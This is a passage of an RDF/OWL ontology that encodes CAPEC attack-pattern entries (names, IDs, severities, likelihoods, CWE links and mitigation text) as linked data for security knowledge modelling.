<rdf:RDF
    xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
    xmlns:owl="http://www.w3.org/2002/07/owl#"
    xmlns:j.0="http://krstProj.com/capec#"
    xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
    xmlns:xsd="http://www.w3.org/2001/XMLSchema#">
  <owl:Class rdf:about="http://krstProj.com/capec#Description"/>
  <owl:Class rdf:about="http://krstProj.com/capec#Skill">
    <rdfs:subClassOf>
      <owl:Class rdf:about="http://krstProj.com/capec#Attacker"/>
    </rdfs:subClassOf>
  </owl:Class>
  <owl:Class rdf:about="http://krstProj.com/capec#AttackPattern"/>
  <owl:Class rdf:about="http://krstProj.com/capec#Vulnerability"/>
  <owl:Class rdf:about="http://krstProj.com/capec#Status">
    <owl:disjointWith>
      <owl:Class rdf:about="http://krstProj.com/capec#Abstraction"/>
    </owl:disjointWith>
  </owl:Class>
  <owl:Class rdf:about="http://krstProj.com/capec#Attack"/>
  <owl:Class rdf:about="http://krstProj.com/capec#Likelihood"/>
  <owl:Class rdf:about="http://krstProj.com/capec#Prerequisite">
    <rdfs:subClassOf rdf:resource="http://krstProj.com/capec#Attacker"/>
  </owl:Class>
  <owl:Class rdf:about="http://krstProj.com/capec#ExecutionFlow">
    <rdfs:subClassOf rdf:resource="http://krstProj.com/capec#Attack"/>
  </owl:Class>
  <owl:Class rdf:about="http://krstProj.com/capec#Severity"/>
  <owl:Class rdf:about="http://krstProj.com/capec#Id">
    <rdfs:subClassOf rdf:resource="http://krstProj.com/capec#AttackPattern"/>
  </owl:Class>
  <owl:Class rdf:about="http://krstProj.com/capec#Name"/>
  <owl:Class rdf:about="http://krstProj.com/capec#Consequence">
    <rdfs:subClassOf rdf:resource="http://krstProj.com/capec#Attack"/>
  </owl:Class>
  <owl:Class rdf:about="http://krstProj.com/capec#MitigationAction">
    <owl:disjointWith rdf:resource="http://krstProj.com/capec#Consequence"/>
    <owl:disjointWith rdf:resource="http://krstProj.com/capec#ExecutionFlow"/>
    <rdfs:subClassOf rdf:resource="http://krstProj.com/capec#Attack"/>
  </owl:Class>
  <owl:Class rdf:about="http://krstProj.com/capec#Resource">
    <owl:disjointWith rdf:resource="http://krstProj.com/capec#Skill"/>
    <rdfs:subClassOf rdf:resource="http://krstProj.com/capec#Attacker"/>
  </owl:Class>
  <owl:ObjectProperty rdf:about="http://krstProj.com/capec#reduces">
    <rdfs:range rdf:resource="http://krstProj.com/capec#Attack"/>
    <rdfs:domain rdf:resource="http://krstProj.com/capec#MitigationAction"/>
  </owl:ObjectProperty>
  <owl:ObjectProperty rdf:about="http://krstProj.com/capec#hasSeverity">
    <rdfs:range rdf:resource="http://krstProj.com/capec#Severity"/>
    <rdfs:domain rdf:resource="http://krstProj.com/capec#AttackPattern"/>
  </owl:ObjectProperty>
  <owl:ObjectProperty rdf:about="http://krstProj.com/capec#hasAbstraction">
    <rdfs:range rdf:resource="http://krstProj.com/capec#Abstraction"/>
    <rdfs:domain rdf:resource="http://krstProj.com/capec#AttackPattern"/>
  </owl:ObjectProperty>
  <owl:ObjectProperty rdf:about="http://krstProj.com/capec#relatedTo">
    <rdfs:range rdf:resource="http://krstProj.com/capec#AttackPattern"/>
    <rdfs:domain rdf:resource="http://krstProj.com/capec#Attack"/>
  </owl:ObjectProperty>
  <owl:ObjectProperty rdf:about="http://krstProj.com/capec#makes">
    <rdfs:range rdf:resource="http://krstProj.com/capec#Attack"/>
    <rdfs:domain rdf:resource="http://krstProj.com/capec#Attacker"/>
  </owl:ObjectProperty>
  <owl:ObjectProperty rdf:about="http://krstProj.com/capec#exploits">
    <rdfs:range rdf:resource="http://krstProj.com/capec#Vulnerability"/>
    <rdfs:domain rdf:resource="http://krstProj.com/capec#Attack"/>
  </owl:ObjectProperty>
  <owl:ObjectProperty rdf:about="http://krstProj.com/capec#executes">
    <rdfs:range rdf:resource="http://krstProj.com/capec#ExecutionFlow"/>
    <rdfs:domain rdf:resource="http://krstProj.com/capec#Attack"/>
  </owl:ObjectProperty>
  <owl:ObjectProperty rdf:about="http://krstProj.com/capec#hasName">
    <rdfs:range rdf:resource="http://krstProj.com/capec#Name"/>
    <rdfs:domain rdf:resource="http://krstProj.com/capec#AttackPattern"/>
  </owl:ObjectProperty>
  <owl:ObjectProperty rdf:about="http://krstProj.com/capec#uses">
    <rdfs:range rdf:resource="http://krstProj.com/capec#Resource"/>
    <rdfs:domain rdf:resource="http://krstProj.com/capec#Attacker"/>
  </owl:ObjectProperty>
  <owl:ObjectProperty rdf:about="http://krstProj.com/capec#hasStatus">
    <rdfs:range rdf:resource="http://krstProj.com/capec#Status"/>
    <rdfs:domain rdf:resource="http://krstProj.com/capec#AttackPattern"/>
  </owl:ObjectProperty>
  <owl:ObjectProperty rdf:about="http://krstProj.com/capec#precondition">
    <rdfs:range rdf:resource="http://krstProj.com/capec#Prerequisite"/>
    <rdfs:domain rdf:resource="http://krstProj.com/capec#Attacker"/>
  </owl:ObjectProperty>
  <owl:ObjectProperty rdf:about="http://krstProj.com/capec#hasLikelihood">
    <rdfs:range rdf:resource="http://krstProj.com/capec#Likelihood"/>
    <rdfs:domain rdf:resource="http://krstProj.com/capec#AttackPattern"/>
  </owl:ObjectProperty>
  <owl:ObjectProperty rdf:about="http://krstProj.com/capec#hasKnowledge">
    <rdfs:range rdf:resource="http://krstProj.com/capec#Vulnerability"/>
    <rdfs:domain rdf:resource="http://krstProj.com/capec#Attacker"/>
  </owl:ObjectProperty>
  <owl:ObjectProperty rdf:about="http://krstProj.com/capec#implies">
    <rdfs:range rdf:resource="http://krstProj.com/capec#Consequence"/>
    <rdfs:domain rdf:resource="http://krstProj.com/capec#Attack"/>
  </owl:ObjectProperty>
  <owl:ObjectProperty rdf:about="http://krstProj.com/capec#need">
    <rdfs:range rdf:resource="http://krstProj.com/capec#Skill"/>
    <rdfs:domain rdf:resource="http://krstProj.com/capec#Attacker"/>
  </owl:ObjectProperty>
  <owl:SymmetricProperty rdf:about="http://krstProj.com/capec#relatedPattern">
    <rdfs:range rdf:resource="http://krstProj.com/capec#AttackPattern"/>
    <rdfs:domain rdf:resource="http://krstProj.com/capec#AttackPattern"/>
  </owl:SymmetricProperty>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Be mindful of your surroundings when discussing sensitive information in public areas.::Implement proper software restriction policies to only allow authorized software on your environment. Use of anti-virus and other security monitoring and detecting tools can aid in this too. Closely monitor installed software for unusual behavior or activity  and implement patches as soon as they become available.::If possible  physically disable the microphone on your machine if it is not needed.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack118">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#651">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:117::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#null">
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack418">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#160">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:113::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity>
                          <j.0:Likelihood rdf:about="http://krstProj.com/capec#Medium">
                            <rdf:type rdf:resource="http://krstProj.com/capec#Severity"/>
                          </j.0:Likelihood>
                        </j.0:hasSeverity>
                        <j.0:hasStatus>
                          <j.0:Status rdf:about="http://krstProj.com/capec#Draft"/>
                        </j.0:hasStatus>
                        <j.0:hasAbstraction>
                          <j.0:Abstraction rdf:about="http://krstProj.com/capec#Standard"/>
                        </j.0:hasAbstraction>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Exploit Script-Based APIs"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::346::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack358">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#516">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:444::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood>
                          <j.0:Severity rdf:about="http://krstProj.com/capec#Low">
                            <rdf:type rdf:resource="http://krstProj.com/capec#Likelihood"/>
                          </j.0:Severity>
                        </j.0:hasLikelihood>
                        <j.0:hasSeverity>
                          <j.0:Likelihood rdf:about="http://krstProj.com/capec#High">
                            <rdf:type rdf:resource="http://krstProj.com/capec#Severity"/>
                          </j.0:Likelihood>
                        </j.0:hasSeverity>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction>
                          <j.0:Abstraction rdf:about="http://krstProj.com/capec#Detailed"/>
                        </j.0:hasAbstraction>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Hardware Component Substitution During Baselining"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack34">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#406">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:150::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus>
                          <j.0:Status rdf:about="http://krstProj.com/capec#Stable"/>
                        </j.0:hasStatus>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Dumpster Diving"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other Documents and materials improperly disposed of can lead to information disclosure if an adversary comes across it.::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack481">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#323">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:312::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#TCP (ISN) Counter Rate Probe"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::200::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack413">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#572">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:165::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Artificially Inflate File Sizes"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack66">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#412">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:407::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Pretexting via Customer Service"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack347">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#391">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:390::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Bypassing Physical Locks"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack187">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#302">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:300::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#TCP FIN Scan"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack360">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#520">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:444::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Counterfeit Hardware Component Inserted During Product Assembly"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack343">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#185">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:184::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity>
                          <j.0:Severity rdf:about="http://krstProj.com/capec#Very High"/>
                        </j.0:hasSeverity>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Malicious Software Download"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::494::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack350">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#261">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:54::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Fuzzing for garnering other adjacent user/sensitive data"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::20::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack221">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#537">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:444::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Infiltration of Hardware Development Environment"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::125::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack78">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#233">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction>
                          <j.0:Abstraction rdf:about="http://krstProj.com/capec#Meta"/>
                        </j.0:hasAbstraction>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Privilege Escalation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::269::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack46">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#209">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:592::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#XSS Using MIME Type Mismatch"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::79::20::646::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack155">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#616">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:154::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Establish Rogue Location"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:IntegrityTECHNICAL IMPACT:Other:NOTE:Confidentiality Integrity Other Successful attacks of this nature can result in a wide variety of consequences and negatively impact confidentiality and integrity based on the adversary&apos;s subsequent actions.::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack404">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#619">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:292::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Signal Strength Tracking"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::201::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack104">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#150">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:116::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Collect Data from Common Resource Locations"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::552::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack121">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#534">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:440::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Malicious Hardware Update"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack100">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#155">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:150::NATURE:CanFollow:CAPEC ID:149::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Screen Temporary Files for Sensitive Information"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::377::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
